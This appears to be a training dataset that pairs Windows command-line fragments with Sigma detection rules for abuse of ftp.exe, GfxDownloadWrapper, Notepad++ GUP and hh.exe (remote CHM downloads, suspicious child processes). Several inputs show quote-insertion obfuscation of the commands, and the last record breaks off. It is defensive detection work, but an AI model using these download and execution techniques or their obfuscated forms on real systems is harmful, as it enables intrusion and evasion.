{"instruction": "Write Sigma rule to detect payload:", "input": "\\ftp.exe \\ftp.exe ftp.exe \"-s:\"", "output": "title: Potential Arbitrary Command Execution Via FTP.EXE\nid: 06b401f4-107c-4ff9-947f-9ec1e7649f1e\nstatus: test\ndescription: Detects execution of \"ftp.exe\" script with the \"-s\" or \"/s\" flag and any child processes ran by \"ftp.exe\".\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Ftp/\nauthor: Victor Sergeev, oscd.community\ndate: 2020-10-09\nmodified: 2024-04-23\ntags:\n    - attack.execution\n    - attack.t1059\n    - attack.defense-evasion\n    - attack.t1202\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_parent:\n        ParentImage|endswith: '\\ftp.exe'\n    selection_child_img:\n        - Image|endswith: '\\ftp.exe'\n        - OriginalFileName: 'ftp.exe'\n    selection_child_cli:\n        CommandLine|contains|windash: '-s:'\n    condition: selection_parent or all of selection_child_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\ftp \\ftp ftp -s:", "output": "title: Potential Arbitrary Command Execution Via FTP.EXE\nid: 06b401f4-107c-4ff9-947f-9ec1e7649f1e\nstatus: test\ndescription: Detects execution of \"ftp.exe\" script with the \"-s\" or \"/s\" flag and any child processes ran by \"ftp.exe\".\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Ftp/\nauthor: Victor Sergeev, oscd.community\ndate: 2020-10-09\nmodified: 2024-04-23\ntags:\n    - attack.execution\n    - attack.t1059\n    - attack.defense-evasion\n    - attack.t1202\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_parent:\n        ParentImage|endswith: '\\ftp.exe'\n    selection_child_img:\n        - Image|endswith: '\\ftp.exe'\n        - OriginalFileName: 'ftp.exe'\n    selection_child_cli:\n        CommandLine|contains|windash: '-s:'\n    condition: selection_parent or all of selection_child_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\ftp.exe -s: ftp.exe \\ftp.exe", "output": "title: Potential Arbitrary Command Execution Via FTP.EXE\nid: 06b401f4-107c-4ff9-947f-9ec1e7649f1e\nstatus: test\ndescription: Detects execution of \"ftp.exe\" script with the \"-s\" or \"/s\" flag and any child processes ran by \"ftp.exe\".\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Ftp/\nauthor: Victor Sergeev, oscd.community\ndate: 2020-10-09\nmodified: 2024-04-23\ntags:\n    - attack.execution\n    - attack.t1059\n    - attack.defense-evasion\n    - attack.t1202\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_parent:\n        ParentImage|endswith: '\\ftp.exe'\n    selection_child_img:\n        - Image|endswith: '\\ftp.exe'\n        - OriginalFileName: 'ftp.exe'\n    selection_child_cli:\n        CommandLine|contains|windash: '-s:'\n    condition: selection_parent or all of selection_child_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\GfxDownloadWrapper.exe http:// https:// https://gameplayapi.intel.com/", "output": "title: Arbitrary File Download Via GfxDownloadWrapper.EXE\nid: eee00933-a761-4cd0-be70-c42fe91731e7\nstatus: test\ndescription: Detects execution of GfxDownloadWrapper.exe with a URL as an argument to download file.\nreferences:\n    - https://lolbas-project.github.io/lolbas/HonorableMentions/GfxDownloadWrapper/\nauthor: Victor Sergeev, oscd.community\ndate: 2020-10-09\nmodified: 2023-10-18\ntags:\n    - attack.command-and-control\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\GfxDownloadWrapper.exe'\n        CommandLine|contains:\n            - 'http://'\n            - 'https://'\n    filter_main_known_urls:\n        CommandLine|contains: 'https://gameplayapi.intel.com/'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\GfxDownloadWrapper.exe http:// \"https://\" \"https://gameplayapi.intel.com/\"", "output": "title: Arbitrary File Download Via GfxDownloadWrapper.EXE\nid: eee00933-a761-4cd0-be70-c42fe91731e7\nstatus: test\ndescription: Detects execution of GfxDownloadWrapper.exe with a URL as an argument to download file.\nreferences:\n    - https://lolbas-project.github.io/lolbas/HonorableMentions/GfxDownloadWrapper/\nauthor: Victor Sergeev, oscd.community\ndate: 2020-10-09\nmodified: 2023-10-18\ntags:\n    - attack.command-and-control\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\GfxDownloadWrapper.exe'\n        CommandLine|contains:\n            - 'http://'\n            - 'https://'\n    filter_main_known_urls:\n        CommandLine|contains: 'https://gameplayapi.intel.com/'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\GfxDownloadWrapper http:// https:// https://gameplayapi.intel.com/", "output": "title: Arbitrary File Download Via GfxDownloadWrapper.EXE\nid: eee00933-a761-4cd0-be70-c42fe91731e7\nstatus: test\ndescription: Detects execution of GfxDownloadWrapper.exe with a URL as an argument to download file.\nreferences:\n    - https://lolbas-project.github.io/lolbas/HonorableMentions/GfxDownloadWrapper/\nauthor: Victor Sergeev, oscd.community\ndate: 2020-10-09\nmodified: 2023-10-18\ntags:\n    - attack.command-and-control\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\GfxDownloadWrapper.exe'\n        CommandLine|contains:\n            - 'http://'\n            - 'https://'\n    filter_main_known_urls:\n        CommandLine|contains: 'https://gameplayapi.intel.com/'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\GfxDownloadWrapper.exe http:// https:// https://gameplayapi.intel.com/", "output": "title: Arbitrary File Download Via GfxDownloadWrapper.EXE\nid: eee00933-a761-4cd0-be70-c42fe91731e7\nstatus: test\ndescription: Detects execution of GfxDownloadWrapper.exe with a URL as an argument to download file.\nreferences:\n    - https://lolbas-project.github.io/lolbas/HonorableMentions/GfxDownloadWrapper/\nauthor: Victor Sergeev, oscd.community\ndate: 2020-10-09\nmodified: 2023-10-18\ntags:\n    - attack.command-and-control\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\GfxDownloadWrapper.exe'\n        CommandLine|contains:\n            - 'http://'\n            - 'https://'\n    filter_main_known_urls:\n        CommandLine|contains: 'https://gameplayapi.intel.com/'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\gpresult.exe /z /v", "output": "title: Gpresult Display Group Policy Information\nid: e56d3073-83ff-4021-90fe-c658e0709e72\nstatus: test\ndescription: Detects cases in which a user uses the built-in Windows utility gpresult to display the Resultant Set of Policy (RSoP) information\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1615/T1615.md\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/gpresult\n    - https://unit42.paloaltonetworks.com/emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve/\n    - https://www.welivesecurity.com/wp-content/uploads/2020/05/ESET_Turla_ComRAT.pdf\nauthor: frack113\ndate: 2022-05-01\ntags:\n    - attack.discovery\n    - attack.t1615\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        Image|endswith: '\\gpresult.exe'\n        CommandLine|contains:\n            - '/z'\n            - '/v'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\\"g\"\"p\"\"r\"\"e\"\"s\"\"u\"\"l\"\"t\"\".\"\"e\"\"x\"\"e\" /z /v", "output": "title: Gpresult Display Group Policy Information\nid: e56d3073-83ff-4021-90fe-c658e0709e72\nstatus: test\ndescription: Detects cases in which a user uses the built-in Windows utility gpresult to display the Resultant Set of Policy (RSoP) information\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1615/T1615.md\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/gpresult\n    - https://unit42.paloaltonetworks.com/emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve/\n    - https://www.welivesecurity.com/wp-content/uploads/2020/05/ESET_Turla_ComRAT.pdf\nauthor: frack113\ndate: 2022-05-01\ntags:\n    - attack.discovery\n    - attack.t1615\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        Image|endswith: '\\gpresult.exe'\n        CommandLine|contains:\n            - '/z'\n            - '/v'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\gpresult /z /v", "output": "title: Gpresult Display Group Policy Information\nid: e56d3073-83ff-4021-90fe-c658e0709e72\nstatus: test\ndescription: Detects cases in which a user uses the built-in Windows utility gpresult to display the Resultant Set of Policy (RSoP) information\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1615/T1615.md\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/gpresult\n    - https://unit42.paloaltonetworks.com/emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve/\n    - https://www.welivesecurity.com/wp-content/uploads/2020/05/ESET_Turla_ComRAT.pdf\nauthor: frack113\ndate: 2022-05-01\ntags:\n    - attack.discovery\n    - attack.t1615\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        Image|endswith: '\\gpresult.exe'\n        CommandLine|contains:\n            - '/z'\n            - '/v'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\gpresult.exe /z /v", "output": "title: Gpresult Display Group Policy Information\nid: e56d3073-83ff-4021-90fe-c658e0709e72\nstatus: test\ndescription: Detects cases in which a user uses the built-in Windows utility gpresult to display the Resultant Set of Policy (RSoP) information\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1615/T1615.md\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/gpresult\n    - https://unit42.paloaltonetworks.com/emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve/\n    - https://www.welivesecurity.com/wp-content/uploads/2020/05/ESET_Turla_ComRAT.pdf\nauthor: frack113\ndate: 2022-05-01\ntags:\n    - attack.discovery\n    - attack.t1615\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        Image|endswith: '\\gpresult.exe'\n        CommandLine|contains:\n            - '/z'\n            - '/v'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\GUP.exe gup.exe -unzipTo http \\notepad++.exe", "output": "title: File Download Using Notepad++ GUP Utility\nid: 44143844-0631-49ab-97a0-96387d6b2d7c\nstatus: test\ndescription: Detects execution of the Notepad++ updater (gup) from a process other than Notepad++ to download files.\nreferences:\n    - https://twitter.com/nas_bench/status/1535322182863179776\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-06-10\nmodified: 2023-03-02\ntags:\n    - attack.command-and-control\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\GUP.exe'\n        - OriginalFileName: 'gup.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - ' -unzipTo '\n            - 'http'\n    filter:\n        ParentImage|endswith: '\\notepad++.exe'\n    condition: all of selection* and not filter\nfalsepositives:\n    - Other parent processes other than notepad++ using GUP that are not currently identified\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\GUP.exe gup.exe -unzipTo http \\notepa\\\"d++.exe\\\"", "output": "title: File Download Using Notepad++ GUP Utility\nid: 44143844-0631-49ab-97a0-96387d6b2d7c\nstatus: test\ndescription: Detects execution of the Notepad++ updater (gup) from a process other than Notepad++ to download files.\nreferences:\n    - https://twitter.com/nas_bench/status/1535322182863179776\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-06-10\nmodified: 2023-03-02\ntags:\n    - attack.command-and-control\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\GUP.exe'\n        - OriginalFileName: 'gup.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - ' -unzipTo '\n            - 'http'\n    filter:\n        ParentImage|endswith: '\\notepad++.exe'\n    condition: all of selection* and not filter\nfalsepositives:\n    - Other parent processes other than notepad++ using GUP that are not currently identified\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\GUP gup -unzipTo http \\notepad++", "output": "title: File Download Using Notepad++ GUP Utility\nid: 44143844-0631-49ab-97a0-96387d6b2d7c\nstatus: test\ndescription: Detects execution of the Notepad++ updater (gup) from a process other than Notepad++ to download files.\nreferences:\n    - https://twitter.com/nas_bench/status/1535322182863179776\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-06-10\nmodified: 2023-03-02\ntags:\n    - attack.command-and-control\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\GUP.exe'\n        - OriginalFileName: 'gup.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - ' -unzipTo '\n            - 'http'\n    filter:\n        ParentImage|endswith: '\\notepad++.exe'\n    condition: all of selection* and not filter\nfalsepositives:\n    - Other parent processes other than notepad++ using GUP that are not currently identified\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\GUP.exe -unzipTo http \\notepad++.exe gup.exe", "output": "title: File Download Using Notepad++ GUP Utility\nid: 44143844-0631-49ab-97a0-96387d6b2d7c\nstatus: test\ndescription: Detects execution of the Notepad++ updater (gup) from a process other than Notepad++ to download files.\nreferences:\n    - https://twitter.com/nas_bench/status/1535322182863179776\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-06-10\nmodified: 2023-03-02\ntags:\n    - attack.command-and-control\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\GUP.exe'\n        - OriginalFileName: 'gup.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - ' -unzipTo '\n            - 'http'\n    filter:\n        ParentImage|endswith: '\\notepad++.exe'\n    condition: all of selection* and not filter\nfalsepositives:\n    - Other parent processes other than notepad++ using GUP that are not currently identified\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "HH.exe \\hh.exe .chm", "output": "title: HH.EXE Execution\nid: 68c8acb4-1b60-4890-8e82-3ddf7a6dba84\nstatus: test\ndescription: Detects the execution of \"hh.exe\" to open \".chm\" files.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1218.001/T1218.001.md\n    - https://eqllib.readthedocs.io/en/latest/analytics/b25aa548-7937-11e9-8f5c-d46d6d62a49e.html\n    - https://www.zscaler.com/blogs/security-research/unintentional-leak-glimpse-attack-vectors-apt37\nauthor: E.M. Anhaus (originally from Atomic Blue Detections, Dan Beavin), oscd.community\ndate: 2019-10-24\nmodified: 2023-12-11\ntags:\n    - attack.defense-evasion\n    - attack.t1218.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - OriginalFileName: 'HH.exe'\n        - Image|endswith: '\\hh.exe'\n    selection_cli:\n        CommandLine|contains: '.chm'\n    condition: all of selection_*\nfalsepositives:\n    - False positives are expected with legitimate \".CHM\"\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "HH.exe \\hh\\\".exe\\\" .chm", "output": "title: HH.EXE Execution\nid: 68c8acb4-1b60-4890-8e82-3ddf7a6dba84\nstatus: test\ndescription: Detects the execution of \"hh.exe\" to open \".chm\" files.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1218.001/T1218.001.md\n    - https://eqllib.readthedocs.io/en/latest/analytics/b25aa548-7937-11e9-8f5c-d46d6d62a49e.html\n    - https://www.zscaler.com/blogs/security-research/unintentional-leak-glimpse-attack-vectors-apt37\nauthor: E.M. Anhaus (originally from Atomic Blue Detections, Dan Beavin), oscd.community\ndate: 2019-10-24\nmodified: 2023-12-11\ntags:\n    - attack.defense-evasion\n    - attack.t1218.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - OriginalFileName: 'HH.exe'\n        - Image|endswith: '\\hh.exe'\n    selection_cli:\n        CommandLine|contains: '.chm'\n    condition: all of selection_*\nfalsepositives:\n    - False positives are expected with legitimate \".CHM\"\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "HH \\hh .chm", "output": "title: HH.EXE Execution\nid: 68c8acb4-1b60-4890-8e82-3ddf7a6dba84\nstatus: test\ndescription: Detects the execution of \"hh.exe\" to open \".chm\" files.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1218.001/T1218.001.md\n    - https://eqllib.readthedocs.io/en/latest/analytics/b25aa548-7937-11e9-8f5c-d46d6d62a49e.html\n    - https://www.zscaler.com/blogs/security-research/unintentional-leak-glimpse-attack-vectors-apt37\nauthor: E.M. Anhaus (originally from Atomic Blue Detections, Dan Beavin), oscd.community\ndate: 2019-10-24\nmodified: 2023-12-11\ntags:\n    - attack.defense-evasion\n    - attack.t1218.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - OriginalFileName: 'HH.exe'\n        - Image|endswith: '\\hh.exe'\n    selection_cli:\n        CommandLine|contains: '.chm'\n    condition: all of selection_*\nfalsepositives:\n    - False positives are expected with legitimate \".CHM\"\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "HH.exe \\hh.exe .chm", "output": "title: HH.EXE Execution\nid: 68c8acb4-1b60-4890-8e82-3ddf7a6dba84\nstatus: test\ndescription: Detects the execution of \"hh.exe\" to open \".chm\" files.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1218.001/T1218.001.md\n    - https://eqllib.readthedocs.io/en/latest/analytics/b25aa548-7937-11e9-8f5c-d46d6d62a49e.html\n    - https://www.zscaler.com/blogs/security-research/unintentional-leak-glimpse-attack-vectors-apt37\nauthor: E.M. Anhaus (originally from Atomic Blue Detections, Dan Beavin), oscd.community\ndate: 2019-10-24\nmodified: 2023-12-11\ntags:\n    - attack.defense-evasion\n    - attack.t1218.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - OriginalFileName: 'HH.exe'\n        - Image|endswith: '\\hh.exe'\n    selection_cli:\n        CommandLine|contains: '.chm'\n    condition: all of selection_*\nfalsepositives:\n    - False positives are expected with legitimate \".CHM\"\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "HH.exe \\hh.exe http:// https:// \\\\\\\\", "output": "title: Remote CHM File Download/Execution Via HH.EXE\nid: f57c58b3-ee69-4ef5-9041-455bf39aaa89\nstatus: test\ndescription: Detects the usage of \"hh.exe\" to execute/download remotely hosted \".chm\" files.\nreferences:\n    - https://www.splunk.com/en_us/blog/security/follina-for-protocol-handlers.html\n    - https://github.com/redcanaryco/atomic-red-team/blob/1cf4dd51f83dcb0ebe6ade902d6157ad2dbc6ac8/atomics/T1218.001/T1218.001.md\n    - https://www.zscaler.com/blogs/security-research/unintentional-leak-glimpse-attack-vectors-apt37\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-09-29\nmodified: 2024-01-31\ntags:\n    - attack.defense-evasion\n    - attack.t1218.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - OriginalFileName: 'HH.exe'\n        - Image|endswith: '\\hh.exe'\n    selection_cli:\n        CommandLine|contains:\n            - 'http://'\n            - 'https://'\n            - '\\\\\\\\'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "HH.exe \\hh.exe http:// \"h\"\"t\"\"t\"\"p\"\"s\"\":\"\"/\"\"/\" \\\\\\\\", "output": "title: Remote CHM File Download/Execution Via HH.EXE\nid: f57c58b3-ee69-4ef5-9041-455bf39aaa89\nstatus: test\ndescription: Detects the usage of \"hh.exe\" to execute/download remotely hosted \".chm\" files.\nreferences:\n    - https://www.splunk.com/en_us/blog/security/follina-for-protocol-handlers.html\n    - https://github.com/redcanaryco/atomic-red-team/blob/1cf4dd51f83dcb0ebe6ade902d6157ad2dbc6ac8/atomics/T1218.001/T1218.001.md\n    - https://www.zscaler.com/blogs/security-research/unintentional-leak-glimpse-attack-vectors-apt37\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-09-29\nmodified: 2024-01-31\ntags:\n    - attack.defense-evasion\n    - attack.t1218.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - OriginalFileName: 'HH.exe'\n        - Image|endswith: '\\hh.exe'\n    selection_cli:\n        CommandLine|contains:\n            - 'http://'\n            - 'https://'\n            - '\\\\\\\\'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "HH \\hh http:// https:// \\\\\\\\", "output": "title: Remote CHM File Download/Execution Via HH.EXE\nid: f57c58b3-ee69-4ef5-9041-455bf39aaa89\nstatus: test\ndescription: Detects the usage of \"hh.exe\" to execute/download remotely hosted \".chm\" files.\nreferences:\n    - https://www.splunk.com/en_us/blog/security/follina-for-protocol-handlers.html\n    - https://github.com/redcanaryco/atomic-red-team/blob/1cf4dd51f83dcb0ebe6ade902d6157ad2dbc6ac8/atomics/T1218.001/T1218.001.md\n    - https://www.zscaler.com/blogs/security-research/unintentional-leak-glimpse-attack-vectors-apt37\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-09-29\nmodified: 2024-01-31\ntags:\n    - attack.defense-evasion\n    - attack.t1218.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - OriginalFileName: 'HH.exe'\n        - Image|endswith: '\\hh.exe'\n    selection_cli:\n        CommandLine|contains:\n            - 'http://'\n            - 'https://'\n            - '\\\\\\\\'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "HH.exe \\hh.exe http:// \\\\\\\\ https://", "output": "title: Remote CHM File Download/Execution Via HH.EXE\nid: f57c58b3-ee69-4ef5-9041-455bf39aaa89\nstatus: test\ndescription: Detects the usage of \"hh.exe\" to execute/download remotely hosted \".chm\" files.\nreferences:\n    - https://www.splunk.com/en_us/blog/security/follina-for-protocol-handlers.html\n    - https://github.com/redcanaryco/atomic-red-team/blob/1cf4dd51f83dcb0ebe6ade902d6157ad2dbc6ac8/atomics/T1218.001/T1218.001.md\n    - https://www.zscaler.com/blogs/security-research/unintentional-leak-glimpse-attack-vectors-apt37\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-09-29\nmodified: 2024-01-31\ntags:\n    - attack.defense-evasion\n    - attack.t1218.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - OriginalFileName: 'HH.exe'\n        - Image|endswith: '\\hh.exe'\n    selection_cli:\n        CommandLine|contains:\n            - 'http://'\n            - 'https://'\n            - '\\\\\\\\'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\hh.exe \\CertReq.exe \\CertUtil.exe \\cmd.exe \\cscript.exe \\installutil.exe \\MSbuild.exe \\MSHTA.EXE \\msiexec.exe \\powershell.exe \\pwsh.exe \\regsvr32.exe \\rundll32.exe \\schtasks.exe \\wmic.exe \\wscript.exe", "output": "title: HTML Help HH.EXE Suspicious Child Process\nid: 52cad028-0ff0-4854-8f67-d25dfcbc78b4\nstatus: test\ndescription: Detects a suspicious child process of a Microsoft HTML Help (HH.exe)\nreferences:\n    - https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/chm-badness-delivers-a-banking-trojan/\n    - https://github.com/elastic/protections-artifacts/commit/746086721fd385d9f5c6647cada1788db4aea95f#diff-27939090904026cc396b0b629c8e4314acd6f5dac40a676edbc87f4567b47eb7\n    - https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/higaisa-or-winnti-apt-41-backdoors-old-and-new/\n    - https://www.zscaler.com/blogs/security-research/unintentional-leak-glimpse-attack-vectors-apt37\nauthor: Maxim Pavlunin, Nasreddine Bencherchali (Nextron Systems)\ndate: 2020-04-01\nmodified: 2023-04-12\ntags:\n    - attack.defense-evasion\n    - attack.execution\n    - attack.initial-access\n    - attack.t1047\n    - attack.t1059.001\n    - attack.t1059.003\n    - attack.t1059.005\n    - attack.t1059.007\n    - attack.t1218\n    - attack.t1218.001\n    - attack.t1218.010\n    - attack.t1218.011\n    - attack.t1566\n    - attack.t1566.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\hh.exe'\n        Image|endswith:\n            - '\\CertReq.exe'\n            - '\\CertUtil.exe'\n            - '\\cmd.exe'\n            - '\\cscript.exe'\n            - '\\installutil.exe'\n            - '\\MSbuild.exe'\n            - '\\MSHTA.EXE'\n            - '\\msiexec.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\regsvr32.exe'\n            - '\\rundll32.exe'\n            - '\\schtasks.exe'\n            - '\\wmic.exe'\n            - '\\wscript.exe'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\hh.exe \\CertReq.exe \\CertUtil.exe \\cmd.exe \\cscript.exe \\installutil.exe \\MSbuild.exe \\MSHTA.EXE \\msiexec.exe \\powershell.exe \"\\pws\"h.exe \\regsvr32.exe \\rundll32.exe \\schtasks.exe \\wmic.exe \\wscript.exe", "output": "title: HTML Help HH.EXE Suspicious Child Process\nid: 52cad028-0ff0-4854-8f67-d25dfcbc78b4\nstatus: test\ndescription: Detects a suspicious child process of a Microsoft HTML Help (HH.exe)\nreferences:\n    - https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/chm-badness-delivers-a-banking-trojan/\n    - https://github.com/elastic/protections-artifacts/commit/746086721fd385d9f5c6647cada1788db4aea95f#diff-27939090904026cc396b0b629c8e4314acd6f5dac40a676edbc87f4567b47eb7\n    - https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/higaisa-or-winnti-apt-41-backdoors-old-and-new/\n    - https://www.zscaler.com/blogs/security-research/unintentional-leak-glimpse-attack-vectors-apt37\nauthor: Maxim Pavlunin, Nasreddine Bencherchali (Nextron Systems)\ndate: 2020-04-01\nmodified: 2023-04-12\ntags:\n    - attack.defense-evasion\n    - attack.execution\n    - attack.initial-access\n    - attack.t1047\n    - attack.t1059.001\n    - attack.t1059.003\n    - attack.t1059.005\n    - attack.t1059.007\n    - attack.t1218\n    - attack.t1218.001\n    - attack.t1218.010\n    - attack.t1218.011\n    - attack.t1566\n    - attack.t1566.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\hh.exe'\n        Image|endswith:\n            - '\\CertReq.exe'\n            - '\\CertUtil.exe'\n            - '\\cmd.exe'\n            - '\\cscript.exe'\n            - '\\installutil.exe'\n            - '\\MSbuild.exe'\n            - '\\MSHTA.EXE'\n            - '\\msiexec.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\regsvr32.exe'\n            - '\\rundll32.exe'\n            - '\\schtasks.exe'\n            - '\\wmic.exe'\n            - '\\wscript.exe'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\hh \\CertReq \\CertUtil \\cmd \\cscript \\installutil \\MSbuild \\MSHTA \\msiexec \\powershell \\pwsh \\regsvr32 \\rundll32 \\schtasks \\wmic \\wscript", "output": "title: HTML Help HH.EXE Suspicious Child Process\nid: 52cad028-0ff0-4854-8f67-d25dfcbc78b4\nstatus: test\ndescription: Detects a suspicious child process of a Microsoft HTML Help (HH.exe)\nreferences:\n    - https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/chm-badness-delivers-a-banking-trojan/\n    - https://github.com/elastic/protections-artifacts/commit/746086721fd385d9f5c6647cada1788db4aea95f#diff-27939090904026cc396b0b629c8e4314acd6f5dac40a676edbc87f4567b47eb7\n    - https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/higaisa-or-winnti-apt-41-backdoors-old-and-new/\n    - https://www.zscaler.com/blogs/security-research/unintentional-leak-glimpse-attack-vectors-apt37\nauthor: Maxim Pavlunin, Nasreddine Bencherchali (Nextron Systems)\ndate: 2020-04-01\nmodified: 2023-04-12\ntags:\n    - attack.defense-evasion\n    - attack.execution\n    - attack.initial-access\n    - attack.t1047\n    - attack.t1059.001\n    - attack.t1059.003\n    - attack.t1059.005\n    - attack.t1059.007\n    - attack.t1218\n    - attack.t1218.001\n    - attack.t1218.010\n    - attack.t1218.011\n    - attack.t1566\n    - attack.t1566.001\nlogsource:\n    category: process_creation\n    